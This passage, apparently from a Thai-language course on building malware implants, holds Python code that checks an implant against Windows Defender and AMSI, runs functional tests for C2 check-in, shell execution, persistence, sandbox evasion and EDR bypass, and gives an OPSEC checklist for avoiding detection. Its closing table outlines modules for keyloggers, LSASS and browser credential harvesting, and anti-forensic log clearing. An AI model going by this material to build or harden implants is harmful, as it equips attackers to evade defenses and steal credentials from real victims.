                "Check with: ThreatCheck, DefenderCheck, AMSITrigger"
            ],
            "defender_check": [
                "# Find exact bytes triggering Windows Defender",
                "ThreatCheck.exe -f implant.exe",
                "# Or: DefenderCheck.exe implant.exe",
                "# Binary search: split file, scan halves, repeat until finding detected region"
            ],
            "amsi_test": [
                "# Test PowerShell AMSI bypass",
                "AMSITrigger.exe -i payload.ps1",
                "# Shows exactly which strings trigger AMSI"
            ]
        }
    
    def functional_testing(self) -> List[Dict]:
        return [
            {"test": "C2 check-in", "verify": "Implant appears in C2 console"},
            {"test": "Sleep/jitter", "verify": "Correct intervals in network capture"},
            {"test": "Shell execution", "verify": "Commands execute and return output"},
            {"test": "File upload/download", "verify": "Files transfer correctly"},
            {"test": "Persistence", "verify": "Survives reboot, re-checks in"},
            {"test": "Kill date", "verify": "Stops running after specified date"},
            {"test": "Sandbox detection", "verify": "Exits cleanly in sandbox"},
            {"test": "EDR bypass", "verify": "No alerts during operation"}
        ]
    
    def opsec_checklist(self) -> List[str]:
        return [
            "Never upload implant to VirusTotal or public sandbox",
            "Test in isolated VM matching target environment",
            "Verify no hardcoded IPs/domains that burn infrastructure",
            "Confirm kill date is set correctly",
            "Test backup C2 channel works if primary is blocked",
            "Verify HTTPS cert is valid (not self-signed)",
            "Check traffic looks legitimate in Wireshark",
            "Verify no beaconing during sandbox detection checks"
        ]


if __name__ == '__main__':
    testing = ImplantTesting()
    print("AV testing (static analysis):")
    for item in testing.av_testing_checklist()['static_analysis']:
        print(f"  {item}")
    
    print("\nFunctional tests:")
    for test in testing.functional_testing():
        print(f"  [TEST] {test['test']}: {test['verify']}")
    
    print("\nOPSEC checklist:")
    for item in testing.opsec_checklist()[:5]:
        print(f"  - {item}")
```

---

## สรุป Part 81

| Step | หัวข้อ | เนื้อหาสำคัญ |
|------|--------|-------------|
| 801 | Implant Architecture | Modular design, C# skeleton |
| 802 | Protocol Design | Packet format, HMAC, HTTP masquerading |
| 803 | Stager Design | Multi-stage, PS cradles, compressed loader |
| 804 | In-Memory Execution | Reflective DLL, donut, .NET in-memory |
| 805 | Persistence/Upgrade | Auto-update, redundant, kill switch |
| 806 | Keylogger/Screenshot | WH_KEYBOARD_LL, BitBlt, PS screenshot |
| 807 | Credential Harvesting | Chrome/Firefox, LSASS, credential stores |
| 808 | Network Recon Module | Host discovery, port scan, service enum |
| 809 | Anti-Forensics | Log clearing, timestomping, secure delete |
| 810 | Implant Testing | AV testing, functional tests, OPSEC checklist |
